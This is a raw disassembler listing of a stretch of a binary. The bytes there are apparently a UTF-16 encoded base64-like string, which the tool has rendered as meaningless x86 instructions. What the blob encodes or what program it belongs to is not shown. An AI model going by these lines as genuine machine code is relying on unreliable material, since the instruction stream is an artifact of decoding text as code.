  40b34b:	38 00                	cmp    %al,(%eax)
  40b34d:	51                   	push   %ecx
  40b34e:	00 4c 00 6d          	add    %cl,0x6d(%eax,%eax,1)
  40b352:	00 7a 00             	add    %bh,0x0(%edx)
  40b355:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  40b359:	6c                   	insb   (%dx),%es:(%edi)
  40b35a:	00 61 00             	add    %ah,0x0(%ecx)
  40b35d:	30 00                	xor    %al,(%eax)
  40b35f:	64 00 30             	add    %dh,%fs:(%eax)
  40b362:	00 32                	add    %dh,(%edx)
  40b364:	00 4b 00             	add    %cl,0x0(%ebx)
  40b367:	6a 00                	push   $0x0
  40b369:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  40b36d:	42                   	inc    %edx
  40b36e:	00 4f 00             	add    %cl,0x0(%edi)
  40b371:	6e                   	outsb  %ds:(%esi),(%dx)
  40b372:	00 76 00             	add    %dh,0x0(%esi)
  40b375:	30 00                	xor    %al,(%eax)
  40b377:	77 00                	ja     0x40b379
  40b379:	46                   	inc    %esi
  40b37a:	00 69 00             	add    %ch,0x0(%ecx)
  40b37d:	71 00                	jno    0x40b37f
  40b37f:	34 00                	xor    $0x0,%al
  40b381:	4d                   	dec    %ebp
  40b382:	00 4c 00 4b          	add    %cl,0x4b(%eax,%eax,1)
  40b386:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b389:	54                   	push   %esp
  40b38a:	00 43 00             	add    %al,0x0(%ebx)
  40b38d:	36 00 6e 00          	add    %ch,%ss:0x0(%esi)
  40b391:	2f                   	das
  40b392:	00 2b                	add    %ch,(%ebx)
  40b394:	00 79 00             	add    %bh,0x0(%ecx)
  40b397:	68 00 71 00 55       	push   $0x55007100
  40b39c:	00 67 00             	add    %ah,0x0(%edi)
  40b39f:	79 00                	jns    0x40b3a1
  40b3a1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3a2:	00 62 00             	add    %ah,0x0(%edx)
  40b3a5:	36 00 6d 00          	add    %ch,%ss:0x0(%ebp)
  40b3a9:	69 00 43 00 54 00    	imul   $0x540043,(%eax),%eax
  40b3af:	78 00                	js     0x40b3b1
  40b3b1:	49                   	dec    %ecx
  40b3b2:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
  40b3b6:	00 58 00             	add    %bl,0x0(%eax)
  40b3b9:	31 00                	xor    %eax,(%eax)
  40b3bb:	66 00 37             	data16 add %dh,(%edi)
  40b3be:	00 57 00             	add    %dl,0x0(%edi)
  40b3c1:	53                   	push   %ebx
  40b3c2:	00 70 00             	add    %dh,0x0(%eax)
  40b3c5:	4a                   	dec    %edx
  40b3c6:	00 41 00             	add    %al,0x0(%ecx)
  40b3c9:	34 00                	xor    $0x0,%al
  40b3cb:	34 00                	xor    $0x0,%al
  40b3cd:	57                   	push   %edi
  40b3ce:	00 55 00             	add    %dl,0x0(%ebp)
  40b3d1:	53                   	push   %ebx
  40b3d2:	00 77 00             	add    %dh,0x0(%edi)
  40b3d5:	4d                   	dec    %ebp
  40b3d6:	00 50 00             	add    %dl,0x0(%eax)
  40b3d9:	79 00                	jns    0x40b3db
  40b3db:	55                   	push   %ebp
  40b3dc:	00 6b 00             	add    %ch,0x0(%ebx)
  40b3df:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40b3e3:	70 00                	jo     0x40b3e5
  40b3e5:	77 00                	ja     0x40b3e7
  40b3e7:	4c                   	dec    %esp
  40b3e8:	00 38                	add    %bh,(%eax)
  40b3ea:	00 4f 00             	add    %cl,0x0(%edi)
  40b3ed:	31 00                	xor    %eax,(%eax)
  40b3ef:	57                   	push   %edi
  40b3f0:	00 73 00             	add    %dh,0x0(%ebx)
  40b3f3:	36 00 74 00 52       	add    %dh,%ss:0x52(%eax,%eax,1)
  40b3f8:	00 50 00             	add    %dl,0x0(%eax)
  40b3fb:	38 00                	cmp    %al,(%eax)
  40b3fd:	61                   	popa
  40b3fe:	00 72 00             	add    %dh,0x0(%edx)
  40b401:	4d                   	dec    %ebp
  40b402:	00 61 00             	add    %ah,0x0(%ecx)
  40b405:	68 00 6b 00 54       	push   $0x54006b00
  40b40a:	00 35 00 4e 00 6b    	add    %dh,0x6b004e00
  40b410:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b413:	7a 00                	jp     0x40b415
  40b415:	31 00                	xor    %eax,(%eax)
  40b417:	73 00                	jae    0x40b419
  40b419:	37                   	aaa
  40b41a:	00 6f 00             	add    %ch,0x0(%edi)
  40b41d:	6c                   	insb   (%dx),%es:(%edi)
  40b41e:	00 79 00             	add    %bh,0x0(%ecx)
  40b421:	2f                   	das
  40b422:	00 41 00             	add    %al,0x0(%ecx)
  40b425:	4e                   	dec    %esi
  40b426:	00 59 00             	add    %bl,0x0(%ecx)
  40b429:	62 00                	bound  %eax,(%eax)
  40b42b:	33 00                	xor    (%eax),%eax
  40b42d:	4f                   	dec    %edi
  40b42e:	00 48 00             	add    %cl,0x0(%eax)
  40b431:	74 00                	je     0x40b433
  40b433:	32 00                	xor    (%eax),%al
  40b435:	2b 00                	sub    (%eax),%eax
  40b437:	43                   	inc    %ebx
  40b438:	00 59 00             	add    %bl,0x0(%ecx)
  40b43b:	2b 00                	sub    (%eax),%eax
  40b43d:	55                   	push   %ebp
  40b43e:	00 4f 00             	add    %cl,0x0(%edi)
  40b441:	6c                   	insb   (%dx),%es:(%edi)
  40b442:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40b446:	00 79 00             	add    %bh,0x0(%ecx)
  40b449:	72 00                	jb     0x40b44b
  40b44b:	31 00                	xor    %eax,(%eax)
  40b44d:	31 00                	xor    %eax,(%eax)
  40b44f:	2b 00                	sub    (%eax),%eax
  40b451:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  40b455:	63 00                	arpl   %eax,(%eax)
  40b457:	39 00                	cmp    %eax,(%eax)
  40b459:	46                   	inc    %esi
  40b45a:	00 46 00             	add    %al,0x0(%esi)
  40b45d:	34 00                	xor    $0x0,%al
  40b45f:	32 00                	xor    (%eax),%al
  40b461:	53                   	push   %ebx
  40b462:	00 4a 00             	add    %cl,0x0(%edx)
  40b465:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  40b469:	77 00                	ja     0x40b46b
  40b46b:	62 00                	bound  %eax,(%eax)
  40b46d:	34 00                	xor    $0x0,%al
  40b46f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b470:	00 47 00             	add    %al,0x0(%edi)
  40b473:	4b                   	dec    %ebx
  40b474:	00 68 00             	add    %ch,0x0(%eax)
  40b477:	4c                   	dec    %esp
  40b478:	00 57 00             	add    %dl,0x0(%edi)
  40b47b:	7a 00                	jp     0x40b47d
  40b47d:	56                   	push   %esi
  40b47e:	00 67 00             	add    %ah,0x0(%edi)
  40b481:	6e                   	outsb  %ds:(%esi),(%dx)
  40b482:	00 4c 00 62          	add    %cl,0x62(%eax,%eax,1)
  40b486:	00 47 00             	add    %al,0x0(%edi)
  40b489:	41                   	inc    %ecx
  40b48a:	00 47 00             	add    %al,0x0(%edi)
  40b48d:	34 00                	xor    $0x0,%al
  40b48f:	39 00                	cmp    %eax,(%eax)
  40b491:	58                   	pop    %eax
  40b492:	00 37                	add    %dh,(%edi)
  40b494:	00 4d 00             	add    %cl,0x0(%ebp)
  40b497:	65 00 2f             	add    %ch,%gs:(%edi)
  40b49a:	00 4e 00             	add    %cl,0x0(%esi)
  40b49d:	34 00                	xor    $0x0,%al
  40b49f:	4f                   	dec    %edi
  40b4a0:	00 4f 00             	add    %cl,0x0(%edi)
  40b4a3:	56                   	push   %esi
  40b4a4:	00 37                	add    %dh,(%edi)
  40b4a6:	00 59 00             	add    %bl,0x0(%ecx)
  40b4a9:	79 00                	jns    0x40b4ab
  40b4ab:	62 00                	bound  %eax,(%eax)
  40b4ad:	79 00                	jns    0x40b4af
  40b4af:	6c                   	insb   (%dx),%es:(%edi)
  40b4b0:	00 39                	add    %bh,(%ecx)
  40b4b2:	00 5a 00             	add    %bl,0x0(%edx)
  40b4b5:	61                   	popa
  40b4b6:	00 68 00             	add    %ch,0x0(%eax)
  40b4b9:	37                   	aaa
  40b4ba:	00 75 00             	add    %dh,0x0(%ebp)
  40b4bd:	44                   	inc    %esp
  40b4be:	00 2f                	add    %ch,(%edi)
  40b4c0:	00 33                	add    %dh,(%ebx)
  40b4c2:	00 66 00             	add    %ah,0x0(%esi)
  40b4c5:	39 00                	cmp    %eax,(%eax)
  40b4c7:	51                   	push   %ecx
  40b4c8:	00 42 00             	add    %al,0x0(%edx)
  40b4cb:	70 00                	jo     0x40b4cd
  40b4cd:	63 00                	arpl   %eax,(%eax)
  40b4cf:	42                   	inc    %edx
  40b4d0:	00 7a 00             	add    %bh,0x0(%edx)
  40b4d3:	6c                   	insb   (%dx),%es:(%edi)
  40b4d4:	00 51 00             	add    %dl,0x0(%ecx)
  40b4d7:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  40b4db:	69 00 66 00 71 00    	imul   $0x710066,(%eax),%eax
  40b4e1:	73 00                	jae    0x40b4e3
  40b4e3:	30 00                	xor    %al,(%eax)
  40b4e5:	37                   	aaa
  40b4e6:	00 44 00 4b          	add    %al,0x4b(%eax,%eax,1)
  40b4ea:	00 4d 00             	add    %cl,0x0(%ebp)
  40b4ed:	77 00                	ja     0x40b4ef
  40b4ef:	66 00 39             	data16 add %bh,(%ecx)
  40b4f2:	00 4b 00             	add    %cl,0x0(%ebx)
  40b4f5:	62 00                	bound  %eax,(%eax)
  40b4f7:	49                   	dec    %ecx
  40b4f8:	00 70 00             	add    %dh,0x0(%eax)
  40b4fb:	78 00                	js     0x40b4fd
  40b4fd:	4b                   	dec    %ebx
  40b4fe:	00 78 00             	add    %bh,0x0(%eax)
  40b501:	47                   	inc    %edi
  40b502:	00 51 00             	add    %dl,0x0(%ecx)
  40b505:	34 00                	xor    $0x0,%al
  40b507:	56                   	push   %esi
  40b508:	00 30                	add    %dh,(%eax)
  40b50a:	00 44 00 2f          	add    %al,0x2f(%eax,%eax,1)
  40b50e:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
  40b512:	00 41 00             	add    %al,0x0(%ecx)
  40b515:	38 00                	cmp    %al,(%eax)
  40b517:	73 00                	jae    0x40b519
  40b519:	39 00                	cmp    %eax,(%eax)
  40b51b:	37                   	aaa
  40b51c:	00 55 00             	add    %dl,0x0(%ebp)
  40b51f:	68 00 49 00 4f       	push   $0x4f004900
  40b524:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
  40b528:	00 55 00             	add    %dl,0x0(%ebp)
  40b52b:	6a 00                	push   $0x0
  40b52d:	6c                   	insb   (%dx),%es:(%edi)
  40b52e:	00 4b 00             	add    %cl,0x0(%ebx)
  40b531:	75 00                	jne    0x40b533
  40b533:	53                   	push   %ebx
  40b534:	00 4d 00             	add    %cl,0x0(%ebp)
  40b537:	79 00                	jns    0x40b539
  40b539:	62 00                	bound  %eax,(%eax)
  40b53b:	31 00                	xor    %eax,(%eax)
  40b53d:	47                   	inc    %edi
  40b53e:	00 67 00             	add    %ah,0x0(%edi)
  40b541:	73 00                	jae    0x40b543
  40b543:	47                   	inc    %edi
  40b544:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  40b548:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  40b54c:	00 2f                	add    %ch,(%edi)
  40b54e:	00 50 00             	add    %dl,0x0(%eax)
  40b551:	44                   	inc    %esp
  40b552:	00 76 00             	add    %dh,0x0(%esi)
  40b555:	48                   	dec    %eax
  40b556:	00 59 00             	add    %bl,0x0(%ecx)
  40b559:	5a                   	pop    %edx
  40b55a:	00 33                	add    %dh,(%ebx)
  40b55c:	00 38                	add    %bh,(%eax)
  40b55e:	00 75 00             	add    %dh,0x0(%ebp)
  40b561:	74 00                	je     0x40b563
  40b563:	63 00                	arpl   %eax,(%eax)
  40b565:	69 00 6d 00 4e 00    	imul   $0x4e006d,(%eax),%eax
  40b56b:	70 00                	jo     0x40b56d
  40b56d:	61                   	popa
  40b56e:	00 4a 00             	add    %cl,0x0(%edx)
  40b571:	6a 00                	push   $0x0
  40b573:	4f                   	dec    %edi
  40b574:	00 47 00             	add    %al,0x0(%edi)
  40b577:	6f                   	outsl  %ds:(%esi),(%dx)
  40b578:	00 61 00             	add    %ah,0x0(%ecx)
  40b57b:	33 00                	xor    (%eax),%eax
  40b57d:	4d                   	dec    %ebp
  40b57e:	00 79 00             	add    %bh,0x0(%ecx)
  40b581:	44                   	inc    %esp
  40b582:	00 72 00             	add    %dh,0x0(%edx)
  40b585:	50                   	push   %eax
  40b586:	00 6a 00             	add    %ch,0x0(%edx)
  40b589:	69 00 33 00 58 00    	imul   $0x580033,(%eax),%eax
  40b58f:	67 00 6d 00          	add    %ch,0x0(%di)
  40b593:	4e                   	dec    %esi
  40b594:	00 4d 00             	add    %cl,0x0(%ebp)
  40b597:	47                   	inc    %edi
  40b598:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b59b:	79 00                	jns    0x40b59d
  40b59d:	37                   	aaa
  40b59e:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
  40b5a2:	00 65 00             	add    %ah,0x0(%ebp)
  40b5a5:	4d                   	dec    %ebp
  40b5a6:	00 5a 00             	add    %bl,0x0(%edx)
  40b5a9:	74 00                	je     0x40b5ab
  40b5ab:	5a                   	pop    %edx
  40b5ac:	00 2f                	add    %ch,(%edi)
  40b5ae:	00 57 00             	add    %dl,0x0(%edi)
  40b5b1:	77 00                	ja     0x40b5b3
  40b5b3:	4f                   	dec    %edi
  40b5b4:	00 43 00             	add    %al,0x0(%ebx)
  40b5b7:	45                   	inc    %ebp
  40b5b8:	00 6a 00             	add    %ch,0x0(%edx)
  40b5bb:	75 00                	jne    0x40b5bd
  40b5bd:	53                   	push   %ebx
  40b5be:	00 6b 00             	add    %ch,0x0(%ebx)
  40b5c1:	72 00                	jb     0x40b5c3
  40b5c3:	6d                   	insl   (%dx),%es:(%edi)
  40b5c4:	00 47 00             	add    %al,0x0(%edi)
  40b5c7:	74 00                	je     0x40b5c9
  40b5c9:	62 00                	bound  %eax,(%eax)
  40b5cb:	45                   	inc    %ebp
  40b5cc:	00 38                	add    %bh,(%eax)
  40b5ce:	00 72 00             	add    %dh,0x0(%edx)
  40b5d1:	50                   	push   %eax
  40b5d2:	00 37                	add    %dh,(%edi)
  40b5d4:	00 4e 00             	add    %cl,0x0(%esi)
  40b5d7:	32 00                	xor    (%eax),%al
  40b5d9:	4a                   	dec    %edx
  40b5da:	00 48 00             	add    %cl,0x0(%eax)
  40b5dd:	39 00                	cmp    %eax,(%eax)
  40b5df:	45                   	inc    %ebp
  40b5e0:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b5e4:	00 55 00             	add    %dl,0x0(%ebp)
  40b5e7:	71 00                	jno    0x40b5e9
  40b5e9:	4b                   	dec    %ebx
  40b5ea:	00 4d 00             	add    %cl,0x0(%ebp)
  40b5ed:	47                   	inc    %edi
  40b5ee:	00 70 00             	add    %dh,0x0(%eax)
  40b5f1:	54                   	push   %esp
  40b5f2:	00 6d 00             	add    %ch,0x0(%ebp)
  40b5f5:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40b5f9:	2f                   	das
  40b5fa:	00 77 00             	add    %dh,0x0(%edi)
  40b5fd:	57                   	push   %edi
  40b5fe:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  40b602:	00 33                	add    %dh,(%ebx)
  40b604:	00 32                	add    %dh,(%edx)
  40b606:	00 7a 00             	add    %bh,0x0(%edx)
  40b609:	69 00 48 00 53 00    	imul   $0x530048,(%eax),%eax
  40b60f:	62 00                	bound  %eax,(%eax)
  40b611:	57                   	push   %edi
  40b612:	00 6b 00             	add    %ch,0x0(%ebx)
  40b615:	4b                   	dec    %ebx
  40b616:	00 66 00             	add    %ah,0x0(%esi)
  40b619:	68 00 79 00 47       	push   $0x47007900
  40b61e:	00 52 00             	add    %dl,0x0(%edx)
  40b621:	31 00                	xor    %eax,(%eax)
  40b623:	6d                   	insl   (%dx),%es:(%edi)
  40b624:	00 73 00             	add    %dh,0x0(%ebx)
  40b627:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40b62b:	6d                   	insl   (%dx),%es:(%edi)
  40b62c:	00 33                	add    %dh,(%ebx)
  40b62e:	00 69 00             	add    %ch,0x0(%ecx)
  40b631:	50                   	push   %eax
  40b632:	00 51 00             	add    %dl,0x0(%ecx)
  40b635:	35 00 4a 00 6b       	xor    $0x6b004a00,%eax
  40b63a:	00 72 00             	add    %dh,0x0(%edx)
  40b63d:	44                   	inc    %esp
  40b63e:	00 46 00             	add    %al,0x0(%esi)
  40b641:	4f                   	dec    %edi
  40b642:	00 41 00             	add    %al,0x0(%ecx)
  40b645:	2b 00                	sub    (%eax),%eax
  40b647:	6f                   	outsl  %ds:(%esi),(%dx)
  40b648:	00 4d 00             	add    %cl,0x0(%ebp)
  40b64b:	47                   	inc    %edi
  40b64c:	00 6d 00             	add    %ch,0x0(%ebp)
  40b64f:	2b 00                	sub    (%eax),%eax
  40b651:	39 00                	cmp    %eax,(%eax)
  40b653:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  40b657:	6a 00                	push   $0x0
  40b659:	72 00                	jb     0x40b65b
  40b65b:	4a                   	dec    %edx
  40b65c:	00 76 00             	add    %dh,0x0(%esi)
  40b65f:	44                   	inc    %esp
  40b660:	00 71 00             	add    %dh,0x0(%ecx)
  40b663:	4a                   	dec    %edx
  40b664:	00 33                	add    %dh,(%ebx)
  40b666:	00 69 00             	add    %ch,0x0(%ecx)
  40b669:	4d                   	dec    %ebp
  40b66a:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
  40b66e:	00 53 00             	add    %dl,0x0(%ebx)
  40b671:	32 00                	xor    (%eax),%al
  40b673:	66 00 54 00 66       	data16 add %dl,0x66(%eax,%eax,1)
  40b678:	00 4b 00             	add    %cl,0x0(%ebx)
  40b67b:	42                   	inc    %edx
  40b67c:	00 6f 00             	add    %ch,0x0(%edi)
  40b67f:	75 00                	jne    0x40b681
  40b681:	47                   	inc    %edi
  40b682:	00 71 00             	add    %dh,0x0(%ecx)
  40b685:	46                   	inc    %esi
  40b686:	00 42 00             	add    %al,0x0(%edx)
  40b689:	68 00 4b 00 6d       	push   $0x6d004b00
  40b68e:	00 6b 00             	add    %ch,0x0(%ebx)
  40b691:	4a                   	dec    %edx
  40b692:	00 72 00             	add    %dh,0x0(%edx)
  40b695:	75 00                	jne    0x40b697
  40b697:	6a 00                	push   $0x0
  40b699:	6d                   	insl   (%dx),%es:(%edi)
  40b69a:	00 37                	add    %dh,(%edi)
  40b69c:	00 78 00             	add    %bh,0x0(%eax)
  40b69f:	39 00                	cmp    %eax,(%eax)
  40b6a1:	47                   	inc    %edi
  40b6a2:	00 76 00             	add    %dh,0x0(%esi)
  40b6a5:	48                   	dec    %eax
  40b6a6:	00 49 00             	add    %cl,0x0(%ecx)
  40b6a9:	44                   	inc    %esp
  40b6aa:	00 4a 00             	add    %cl,0x0(%edx)
  40b6ad:	37                   	aaa
  40b6ae:	00 31                	add    %dh,(%ecx)
  40b6b0:	00 7a 00             	add    %bh,0x0(%edx)
  40b6b3:	75 00                	jne    0x40b6b5
  40b6b5:	30 00                	xor    %al,(%eax)
  40b6b7:	51                   	push   %ecx
  40b6b8:	00 42 00             	add    %al,0x0(%edx)
  40b6bb:	62 00                	bound  %eax,(%eax)
  40b6bd:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6be:	00 2f                	add    %ch,(%edi)
  40b6c0:	00 43 00             	add    %al,0x0(%ebx)
  40b6c3:	32 00                	xor    (%eax),%al
  40b6c5:	57                   	push   %edi
  40b6c6:	00 4e 00             	add    %cl,0x0(%esi)
  40b6c9:	6c                   	insb   (%dx),%es:(%edi)
  40b6ca:	00 68 00             	add    %ch,0x0(%eax)
  40b6cd:	53                   	push   %ebx
  40b6ce:	00 68 00             	add    %ch,0x0(%eax)
  40b6d1:	2f                   	das
  40b6d2:	00 62 00             	add    %ah,0x0(%edx)
  40b6d5:	61                   	popa
  40b6d6:	00 5a 00             	add    %bl,0x0(%edx)
  40b6d9:	70 00                	jo     0x40b6db
  40b6db:	42                   	inc    %edx
  40b6dc:	00 48 00             	add    %cl,0x0(%eax)
  40b6df:	63 00                	arpl   %eax,(%eax)
  40b6e1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6e2:	00 50 00             	add    %dl,0x0(%eax)
  40b6e5:	39 00                	cmp    %eax,(%eax)
  40b6e7:	6d                   	insl   (%dx),%es:(%edi)
  40b6e8:	00 58 00             	add    %bl,0x0(%eax)
  40b6eb:	75 00                	jne    0x40b6ed
  40b6ed:	54                   	push   %esp
  40b6ee:	00 6a 00             	add    %ch,0x0(%edx)
  40b6f1:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  40b6f5:	4b                   	dec    %ebx
  40b6f6:	00 65 00             	add    %ah,0x0(%ebp)
  40b6f9:	70 00                	jo     0x40b6fb
  40b6fb:	76 00                	jbe    0x40b6fd
  40b6fd:	4a                   	dec    %edx
  40b6fe:	00 76 00             	add    %dh,0x0(%esi)
  40b701:	54                   	push   %esp
  40b702:	00 7a 00             	add    %bh,0x0(%edx)
  40b705:	57                   	push   %edi
  40b706:	00 4a 00             	add    %cl,0x0(%edx)
  40b709:	72 00                	jb     0x40b70b
  40b70b:	4b                   	dec    %ebx
  40b70c:	00 56 00             	add    %dl,0x0(%esi)
  40b70f:	41                   	inc    %ecx
  40b710:	00 57 00             	add    %dl,0x0(%edi)
  40b713:	57                   	push   %edi
  40b714:	00 66 00             	add    %ah,0x0(%esi)
  40b717:	39 00                	cmp    %eax,(%eax)
  40b719:	79 00                	jns    0x40b71b
  40b71b:	66 00 5a 00          	data16 add %bl,0x0(%edx)
  40b71f:	58                   	pop    %eax
  40b720:	00 66 00             	add    %ah,0x0(%esi)
  40b723:	42                   	inc    %edx
  40b724:	00 6b 00             	add    %ch,0x0(%ebx)
  40b727:	79 00                	jns    0x40b729
  40b729:	55                   	push   %ebp
  40b72a:	00 31                	add    %dh,(%ecx)
  40b72c:	00 71 00             	add    %dh,0x0(%ecx)
  40b72f:	56                   	push   %esi
  40b730:	00 7a 00             	add    %bh,0x0(%edx)
  40b733:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  40b737:	37                   	aaa
  40b738:	00 4a 00             	add    %cl,0x0(%edx)
  40b73b:	37                   	aaa
  40b73c:	00 6f 00             	add    %ch,0x0(%edi)
  40b73f:	42                   	inc    %edx
  40b740:	00 31                	add    %dh,(%ecx)
  40b742:	00 55 00             	add    %dl,0x0(%ebp)
  40b745:	63 00                	arpl   %eax,(%eax)
  40b747:	55                   	push   %ebp
  40b748:	00 54 00 43          	add    %dl,0x43(%eax,%eax,1)
  40b74c:	00 58 00             	add    %bl,0x0(%eax)
  40b74f:	54                   	push   %esp
  40b750:	00 59 00             	add    %bl,0x0(%ecx)
  40b753:	56                   	push   %esi
  40b754:	00 70 00             	add    %dh,0x0(%eax)
  40b757:	59                   	pop    %ecx
  40b758:	00 75 00             	add    %dh,0x0(%ebp)
  40b75b:	74 00                	je     0x40b75d
  40b75d:	66 00 38             	data16 add %bh,(%eax)
  40b760:	00 79 00             	add    %bh,0x0(%ecx)
  40b763:	6b 00 70             	imul   $0x70,(%eax),%eax
  40b766:	00 4b 00             	add    %cl,0x0(%ebx)
  40b769:	77 00                	ja     0x40b76b
  40b76b:	42                   	inc    %edx
  40b76c:	00 4e 00             	add    %cl,0x0(%esi)
  40b76f:	68 00 63 00 38       	push   $0x38006300
  40b774:	00 4d 00             	add    %cl,0x0(%ebp)
  40b777:	5a                   	pop    %edx
  40b778:	00 43 00             	add    %al,0x0(%ebx)
  40b77b:	6a 00                	push   $0x0
  40b77d:	46                   	inc    %esi
  40b77e:	00 7a 00             	add    %bh,0x0(%edx)
  40b781:	32 00                	xor    (%eax),%al
  40b783:	73 00                	jae    0x40b785
  40b785:	51                   	push   %ecx
  40b786:	00 76 00             	add    %dh,0x0(%esi)
  40b789:	50                   	push   %eax
  40b78a:	00 49 00             	add    %cl,0x0(%ecx)
  40b78d:	69 00 2b 00 79 00    	imul   $0x79002b,(%eax),%eax
  40b793:	54                   	push   %esp
  40b794:	00 5a 00             	add    %bl,0x0(%edx)
  40b797:	71 00                	jno    0x40b799
  40b799:	54                   	push   %esp
  40b79a:	00 62 00             	add    %ah,0x0(%edx)
  40b79d:	61                   	popa
  40b79e:	00 55 00             	add    %dl,0x0(%ebp)
  40b7a1:	79 00                	jns    0x40b7a3
  40b7a3:	4e                   	dec    %esi
  40b7a4:	00 72 00             	add    %dh,0x0(%edx)
  40b7a7:	39 00                	cmp    %eax,(%eax)
  40b7a9:	32 00                	xor    (%eax),%al
  40b7ab:	53                   	push   %ebx
  40b7ac:	00 65 00             	add    %ah,0x0(%ebp)
  40b7af:	5a                   	pop    %edx
  40b7b0:	00 55 00             	add    %dl,0x0(%ebp)
  40b7b3:	47                   	inc    %edi
  40b7b4:	00 66 00             	add    %ah,0x0(%esi)
  40b7b7:	4c                   	dec    %esp
  40b7b8:	00 47 00             	add    %al,0x0(%edi)
  40b7bb:	77 00                	ja     0x40b7bd
  40b7bd:	63 00                	arpl   %eax,(%eax)
  40b7bf:	39 00                	cmp    %eax,(%eax)
  40b7c1:	61                   	popa
  40b7c2:	00 53 00             	add    %dl,0x0(%ebx)
  40b7c5:	6d                   	insl   (%dx),%es:(%edi)
  40b7c6:	00 70 00             	add    %dh,0x0(%eax)
  40b7c9:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40b7cd:	49                   	dec    %ecx
  40b7ce:	00 63 00             	add    %ah,0x0(%ebx)
  40b7d1:	2b 00                	sub    (%eax),%eax
  40b7d3:	6c                   	insb   (%dx),%es:(%edi)
  40b7d4:	00 42 00             	add    %al,0x0(%edx)
  40b7d7:	4c                   	dec    %esp
  40b7d8:	00 77 00             	add    %dh,0x0(%edi)
  40b7db:	57                   	push   %edi
  40b7dc:	00 61 00             	add    %ah,0x0(%ecx)
  40b7df:	30 00                	xor    %al,(%eax)
  40b7e1:	2b 00                	sub    (%eax),%eax
  40b7e3:	57                   	push   %edi
  40b7e4:	00 4f 00             	add    %cl,0x0(%edi)
  40b7e7:	4c                   	dec    %esp
  40b7e8:	00 62 00             	add    %ah,0x0(%edx)
  40b7eb:	73 00                	jae    0x40b7ed
  40b7ed:	6c                   	insb   (%dx),%es:(%edi)
  40b7ee:	00 63 00             	add    %ah,0x0(%ebx)
  40b7f1:	61                   	popa
  40b7f2:	00 76 00             	add    %dh,0x0(%esi)
  40b7f5:	6d                   	insl   (%dx),%es:(%edi)
  40b7f6:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  40b7fa:	00 2b                	add    %ch,(%ebx)
  40b7fc:	00 4f 00             	add    %cl,0x0(%edi)
  40b7ff:	6f                   	outsl  %ds:(%esi),(%dx)
  40b800:	00 4d 00             	add    %cl,0x0(%ebp)
  40b803:	4f                   	dec    %edi
  40b804:	00 75 00             	add    %dh,0x0(%ebp)
  40b807:	64 00 68 00          	add    %ch,%fs:0x0(%eax)
  40b80b:	4f                   	dec    %edi
  40b80c:	00 50 00             	add    %dl,0x0(%eax)
  40b80f:	67 00 44 00          	add    %al,0x0(%si)
  40b813:	4f                   	dec    %edi
  40b814:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
  40b818:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
  40b81c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b81f:	4a                   	dec    %edx
  40b820:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40b824:	00 5a 00             	add    %bl,0x0(%edx)
  40b827:	51                   	push   %ecx
  40b828:	00 53 00             	add    %dl,0x0(%ebx)
  40b82b:	62 00                	bound  %eax,(%eax)
  40b82d:	76 00                	jbe    0x40b82f
  40b82f:	4e                   	dec    %esi
  40b830:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
  40b834:	00 63 00             	add    %ah,0x0(%ebx)
  40b837:	57                   	push   %edi
  40b838:	00 57 00             	add    %dl,0x0(%edi)
  40b83b:	44                   	inc    %esp
  40b83c:	00 76 00             	add    %dh,0x0(%esi)
  40b83f:	51                   	push   %ecx
  40b840:	00 62 00             	add    %ah,0x0(%edx)
  40b843:	72 00                	jb     0x40b845
  40b845:	48                   	dec    %eax
  40b846:	00 2b                	add    %ch,(%ebx)
  40b848:	00 77 00             	add    %dh,0x0(%edi)
  40b84b:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40b84f:	69 00 4d 00 55 00    	imul   $0x55004d,(%eax),%eax
  40b855:	57                   	push   %edi
  40b856:	00 49 00             	add    %cl,0x0(%ecx)
  40b859:	50                   	push   %eax
  40b85a:	00 2f                	add    %ch,(%edi)
  40b85c:	00 7a 00             	add    %bh,0x0(%edx)
  40b85f:	43                   	inc    %ebx
  40b860:	00 65 00             	add    %ah,0x0(%ebp)
  40b863:	31 00                	xor    %eax,(%eax)
  40b865:	75 00                	jne    0x40b867
  40b867:	4f                   	dec    %edi
  40b868:	00 42 00             	add    %al,0x0(%edx)
  40b86b:	62 00                	bound  %eax,(%eax)
  40b86d:	77 00                	ja     0x40b86f
  40b86f:	63 00                	arpl   %eax,(%eax)
  40b871:	54                   	push   %esp
  40b872:	00 65 00             	add    %ah,0x0(%ebp)
  40b875:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b879:	33 00                	xor    (%eax),%eax
  40b87b:	39 00                	cmp    %eax,(%eax)
  40b87d:	74 00                	je     0x40b87f
  40b87f:	78 00                	js     0x40b881
